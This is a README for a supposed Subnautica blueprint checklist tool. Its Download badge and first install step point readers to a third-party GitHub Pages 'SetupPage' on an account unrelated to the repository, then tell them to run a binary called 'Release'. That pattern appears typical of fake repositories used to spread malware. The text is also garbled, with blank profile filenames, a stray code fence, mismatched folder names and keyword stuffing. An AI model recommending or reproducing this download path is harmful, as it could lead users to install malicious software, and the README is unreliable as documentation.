# Subnautica Blueprint Checklist Tracker

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-be185d?style=flat-square&logo=steam&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/TigerProxy78/Subnautica-Blueprint-Checklist-Tracker">
    <img src="https://img.shields.io/badge/Repository-Open%20Source-2f855a?style=for-the-badge&logo=github&logoColor=white" alt="Repository">
  </a>
  <a href="https://github.com/TigerProxy78/Subnautica-Blueprint-Checklist-Tracker/releases">
    <img src="https://img.shields.io/badge/Latest%20Version-1.4.2-4c51bf?style=plastic&logo=git&logoColor=white" alt="Version">
  </a>
  <a href="https://github.com/TigerProxy78/Subnautica-Blueprint-Checklist-Tracker/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-0e9f6e?style=flat&logo=opensourceinitiative&logoColor=white" alt="License">
  </a>
  <a href="https://github.com/TigerProxy78/Subnautica-Blueprint-Checklist-Tracker/issues">
    <img src="https://img.shields.io/badge/Issues-Open%20Support-ff8c00?style=flat-square&logo=bug&logoColor=white" alt="Issues">
  </a>
  <a href="https://discord.gg/subnautica">
    <img src="https://img.shields.io/badge/Community-Discord-7289da?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
  </a>
</p>

---

## Overview

The **Subnautica Blueprint Checklist Tracker** is a lightweight, configurable package that lets players keep an organized view of every craftable item they have discovered or still need to locate. Rather than memorising hundreds of fragment locations, users can load a profile that mirrors their current in‑game progress, toggle individual blueprint states, and export the list for later reference. The project ships with three ready‑made profiles (``, ``, ``) plus a `` placeholder for personal tweaks.

Key capabilities include:

* **Profile‑driven organization** – switch between “vanilla”, “hard‑core” or “creative” presets with a single click.
* **Dynamic status flags** – each blueprint can be marked *Found*, *Scanned*, *Unlocked*, or *Ignored*.
* **Export & import** – generate a CSV snapshot or reload a saved checklist without manual editing.
* **Cross‑platform compatibility** – works on Windows, macOS and Linux as a simple JSON‑driven runtime.

All assets are bundled in the latest release, eliminating the need for separate downloads.

---

## Installation & First‑Run

1. Click the **Download** badge above to open the official release page.
2. Download the `Subnautica-Blueprint-Checklist-Tracker.zip` archive.
3. Extract the archive into any folder you keep for Subnautica utilities.
4. Inside the extracted directory you will find:

```
Subnautica-Blueprint-Checklist-Tracker/
├─ config/
│  ├─
│  ├─
│  ├─
│  └─
├─ data/
│  ├─ blueprints.json
│  └─ fragments.json
├─ Release   (or tracker.app on macOS)
└─ README.md
```

5. Launch `Release` (or the platform‑appropriate binary). The application will auto‑detect the `config` folder and load `` unless a different profile is chosen from the UI.

6. Use the **Profile** dropdown to select a preset, then tick or untick blueprint entries to reflect your in‑game discoveries.

7. When you are satisfied, press **Export** to create `blueprint_report.csv` in the root folder. The file can be opened with any spreadsheet program for offline reference.

---

# Blueprint Checklist Tracker – default profile
# Format: blueprint_id = status
Seaglide = Found
LaserCutter = Scanned
PrawnSuit = Locked
```

Supported status values: `Found`, `Scanned`, `Unlocked`, `Locked`, `Ignored`. The tracker validates entries on load and reports any unknown identifiers in the **Log** pane.

---

## Usage Workflow

| Step | Action | Result |
|------|--------|--------|
| 1 | Open the tracker application. | Main window appears with the default profile loaded. |
| 2 | Choose a profile from the **Profile** menu. | All blueprint rows refresh to reflect the selected configuration. |
| 3 | Click a row to cycle its status (Found → Scanned → Unlocked → Locked → Ignored). | Visual indicator updates instantly; underlying config file is kept in memory. |
| 4 | Press **Save** to write the current state back to the active `.cfg`. | The file on disk now mirrors your in‑game progress. |
| 5 | Use **Export** to generate a CSV snapshot. | `blueprint_report.csv` appears in the root folder, ready for sharing or archiving. |
| 6 | To revert, click **Load** and select a previously saved `.cfg`. | Tracker restores the exact checklist from that file. |

The UI also offers a quick‑filter bar at the top: type “Seaglide” to locate a specific blueprint, or filter by status using keywords such as `locked` or `unlocked`.

---

## FAQ & Troubleshooting

**Q: The application starts but shows an empty list.**
A: Verify that `data/blueprints.json` exists and contains valid JSON. The file is included in every release; if it is missing, re‑extract the archive.

**Q: Changes are not persisting after I close the program.**
A: Make sure you click **Save** before exiting. The tracker only writes to the active `.cfg` when the Save button is pressed.

**Q: I receive “Unknown blueprint ID” warnings in the Log pane.**
A: This usually means the config file references a blueprint that no longer exists in the current version of Subnautica. Edit the offending line or remove it; the tracker will ignore unknown IDs on the next load.

**Q: Can I run the tracker alongside the game?**
A: Yes. The executable is completely independent and does not interfere with the game’s runtime files.

**Q: I need a profile for a modded version of Subnautica.**
A: Create a copy of any existing `.cfg`, rename it (e.g., ``), and edit the file to include the additional blueprint IDs. Then select the new profile from the dropdown.

---

## Contributing

Contributions are encouraged. If you discover a missing blueprint, an UI improvement, or want to add language localisation, please:

1. Fork the repository.
2. Create a new branch named `feature/<description>`.
3. Modify the appropriate files (`data/blueprints.json`, UI assets, or configuration templates).
4. Open a Pull Request with a clear description of the change.

All contributions are expected to follow the existing file‑structure conventions and to include updates to the README where applicable.

---

## License

The **Subnautica Blueprint Checklist Tracker** is released under the MIT License. See the `LICENSE` file in the repository root for full terms.

---

*Keywords:* subnautica, blueprint, checklist, tracker, subnautica-blueprint, blueprint-checklist, checklist-tracker, subnautica-manager, subnautica-helper, subnautica-config

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```